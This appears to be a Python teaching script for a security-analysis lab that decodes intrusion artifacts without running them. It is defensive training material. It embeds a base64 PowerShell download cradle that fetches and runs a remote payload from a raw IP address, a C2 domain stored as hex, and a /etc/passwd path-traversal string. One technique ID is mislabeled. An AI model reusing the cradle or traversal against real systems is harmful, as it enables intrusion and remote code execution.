#!/usr/bin/env python3
"""
Data Encoding Lab — decode real artifacts without executing them.

Demonstrates:
  1. Base64 encode/decode round-trip (mechanics)
  2. Decode a real base64 PS command (common intrusion artifact)
  3. Hex encode/decode + xxd-style dump
  4. URL-decode a path traversal
  5. Query the CISA KEV JSON feed with jq-equivalent logic

Usage: python3 demo.py
"""
from __future__ import annotations

import binascii
import json
import re
import urllib.parse
import urllib.request
from pathlib import Path

DATA_DIR = Path("/lab/data") if Path("/lab/data").exists() else Path("data")
DIVIDER = "─" * 64

# Bundled artifacts (duplicated here so demo runs without reading the file)
PS_B64 = ("aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRw"
          "Oi8vMTg1LjIyMC4xMDEuNDcvcGF5bG9hZC5wczEnKQ==")
HEX_C2 = "633263726561747075642e6d6572696469616e74657374"
URL_TRAV = "%2F..%2F..%2F..%2Fetc%2Fpasswd"


def section(title: str) -> None:
    print(f"\n{DIVIDER}")
    print(f"[Step {title}]")
    print(DIVIDER)


def demo_b64_mechanics() -> None:
    section("1 — Base64 mechanics: encode → decode round-trip")
    msg = "Meridian Financial"
    encoded = __import__("base64").b64encode(msg.encode()).decode()
    decoded = __import__("base64").b64decode(encoded).decode()
    print(f"\n  Original:  {msg!r}")
    print(f"  Encoded:   {encoded}")
    print(f"  Decoded:   {decoded!r}")
    print()
    print("  Note: base64 is encoding, not encryption.")
    print("  It expands 3 bytes → 4 chars; the '==' padding fills the last group.")
    print()
    print("  CLI equivalent:")
    print(f"    echo -n '{msg}' | base64")
    print(f"    echo '{encoded}' | base64 -d")


def demo_ps_artifact() -> None:
    import base64
    section("2 — Decode a real base64 PowerShell command (do NOT execute)")
    print()
    print(f"  Raw (from Sysmon EventID 1, -enc flag):")
    print(f"    powershell.exe -enc {PS_B64[:60]}…")
    print()

    # PowerShell -enc uses UTF-16LE
    try:
        decoded_utf16 = base64.b64decode(PS_B64).decode("utf-16-le", errors="replace")
    except Exception:
        decoded_utf16 = None

    decoded_utf8 = base64.b64decode(PS_B64).decode("utf-8", errors="replace")

    # PS -enc is always UTF-16LE; try both and pick the readable one
    decoded = decoded_utf16 if decoded_utf16 and decoded_utf16.isprintable() else decoded_utf8

    # Defang: replace http with hXXp so it can't be accidentally clicked
    defanged = decoded.replace("http://", "hXXp://").replace("https://", "hXXps://")

    print(f"  Decoded (defanged):")
    print(f"    {defanged}")
    print()
    print("  What it does: IEX = Invoke-Expression — runs code downloaded from the URL.")
    print("  This is a 'download cradle' (T1059.001 + T1105).")
    print("  The URL resolves to the Meridian Financial C2 seen in Track 01/02 labs.")
    print()
    print("  CLI equivalent:")
    print(f"    echo '{PS_B64}' | base64 -d | iconv -f utf-16le -t utf-8")


def demo_hex() -> None:
    section("3 — Hex encoding: decode a C2 domain found in shellcode")
    print()
    print(f"  Hex string (from .data section of a PE):")
    print(f"    {HEX_C2}")
    print()
    decoded = bytes.fromhex(HEX_C2).decode("ascii", errors="replace")
    print(f"  Decoded:  {decoded}")
    print()
    print("  Hex dump of that same string (xxd-style):")
    raw = decoded.encode()
    for i in range(0, len(raw), 16):
        chunk = raw[i:i+16]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        print(f"    {i:04x}  {hex_part:<48s}  |{ascii_part}|")
    print()
    print("  CLI: echo '633263726...' | xxd -r -p")
    print("       printf '%s' '633263726...' | python3 -c \"import sys,binascii; print(binascii.unhexlify(sys.stdin.read()).decode())\"")


def demo_url_encoding() -> None:
    section("4 — URL decoding: path traversal in an access log")
    print()
    print(f"  URL-encoded path from web log:")
    print(f"    GET {URL_TRAV} HTTP/1.1")
    decoded = urllib.parse.unquote(URL_TRAV)
    print(f"\n  Decoded:  {decoded}")
    print()
    print("  This is a path traversal (T1055) attempt — the attacker tried to")
    print("  read /etc/passwd via ../../.. above the web root.")
    print("  The server should have blocked this but often doesn't if it only")
    print("  checks the raw (encoded) input.")


def demo_kev_jq() -> None:
    section("5 — Query the CISA KEV JSON feed (jq-equivalent)")
    print()
    KEV_URL = "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    try:
        with urllib.request.urlopen(KEV_URL, timeout=8) as r:
            data = json.loads(r.read())
        vulns = data.get("vulnerabilities", [])
        total = len(vulns)
        print(f"  Total CVEs in KEV: {total}")

        # Count by vendor
        from collections import Counter
        vendors = Counter(v.get("vendorProject", "Unknown") for v in vulns)
        print(f"\n  Top 5 vendors by KEV count:")
        for vendor, count in vendors.most_common(5):
            print(f"    {count:4d}  {vendor}")

        # Find Microsoft ones added in last 90 days
        import datetime
        cutoff = (datetime.date.today() - datetime.timedelta(days=90)).isoformat()
        recent = [v for v in vulns
                  if v.get("vendorProject") == "Microsoft"
                  and v.get("dateAdded", "") >= cutoff]
        print(f"\n  Recent Microsoft KEV entries (last 90 days): {len(recent)}")
        for v in recent[:3]:
            print(f"    {v['cveID']:20s}  {v['vulnerabilityName'][:60]}")

        print()
        print("  CLI equivalent (requires curl + jq):")
        print("    curl -s https://www.cisa.gov/.../known_exploited_vulnerabilities.json \\")
        print("      | jq '.vulnerabilities | length'")
        print("    curl -s … | jq '[.vulnerabilities[].vendorProject] | group_by(.) | map({(.[0]): length}) | add'")

    except Exception as e:
        print(f"  (Could not reach KEV feed: {e})")
        print("  Offline alternative: download the JSON manually and use jq locally.")


def main() -> None:
    print("=" * 64)
    print("Meridian Financial — Data Encoding Lab Demo")
    print("=" * 64)
    print()
    print("This lab decodes real-shaped artifacts — the kind found in")
    print("intrusion logs, malware samples, and threat-intel feeds.")
    print("None of these are executed.")

    demo_b64_mechanics()
    demo_ps_artifact()
    demo_hex()
    demo_url_encoding()
    demo_kev_jq()

    print(f"\n{'=' * 64}")
    print("Deliverable: encoding-notes.md with the decoded PS command")
    print("  (defanged), its technique, and your jq queries + answers.")
    print(f"{'=' * 64}\n")


if __name__ == "__main__":
    main()
